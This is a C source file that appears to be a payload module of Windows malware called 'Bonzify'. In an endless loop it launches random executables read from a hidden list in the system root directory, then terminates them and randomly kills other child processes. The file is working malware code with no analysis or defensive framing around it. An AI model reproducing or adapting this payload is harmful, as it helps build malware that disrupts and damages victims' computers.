#include <Windows.h>
#include <TlHelp32.h>

#include "../Bonzify/Utils.h"
#include "Payloads.h"

static DWORD WINAPI killProcessThread(LPVOID parameter);

DWORD WINAPI OpenProgramsThread(LPVOID parameter) {
	HANDLE exeFiles = INVALID_HANDLE_VALUE;

	for (;;) {
		Sleep(random() % 8000 + 2000);

		HANDLE proc = RunFileSimple(randomEXE());
		CreateThread(NULL, 0, killProcessThread, proc, 0, NULL);
	}
}

static DWORD WINAPI killProcessThread(LPVOID parameter) {
	Sleep(random() % 8000 + 3000);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(procEntry);

	BOOL hasNext = Process32First(snapshot, &procEntry);

	while (hasNext) {
		if (procEntry.th32ParentProcessID == GetCurrentProcessId() && random() % 5 == 0) {
			KillProcessByID(procEntry.th32ProcessID);
		}

		hasNext = Process32Next(snapshot, &procEntry);
	}

	TerminateProcess(parameter, 0);

	return 0;
}

LPTSTR randomEXE() {
	for (;;) {
		HANDLE exeFiles = CreateFile(ExpandPath(TEXT("%SYSTEMROOT%\\executables.bin")), GENERIC_READ,
			FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);

		if (exeFiles == INVALID_HANDLE_VALUE) {
			Sleep(100);
			continue;
		}

		//SetFilePointer(exeFiles, 0, 0, SEEK_SET);
		DWORD exeCount = GetFileSize(exeFiles, NULL) / MAX_PATH / sizeof(TCHAR);

		if (exeCount < 1) {
			CloseHandle(exeFiles);
			Sleep(100);
			continue;
		}

		int index = random() % exeCount;
		SetFilePointer(exeFiles, index * MAX_PATH * sizeof(TCHAR), 0, SEEK_SET);

		LPTSTR path = (LPTSTR)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH + 1) * sizeof(TCHAR));

		DWORD read;
		ReadFile(exeFiles, path, MAX_PATH * sizeof(TCHAR), &read, NULL);

		CloseHandle(exeFiles);

		return path;
	}
}